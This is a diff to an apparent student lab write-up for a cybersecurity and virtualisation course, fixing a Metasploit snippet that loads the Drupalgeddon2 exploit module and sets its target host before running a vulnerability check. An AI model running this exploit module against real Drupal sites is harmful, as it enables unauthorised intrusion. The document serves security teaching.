@@ -117,7 +117,7 @@ Cybersecurity &amp; Virtualisation - NPE Opdracht 2022-2023
 
   ```bash
     use exploit/unix/webapp/drupal_drupalgeddon2
-    set LHOST xxx.xxx.xxx.xxx
+    set RHOSTS xxx.xxx.xxx.xxx
     set VERBOSE true
     check
   ```
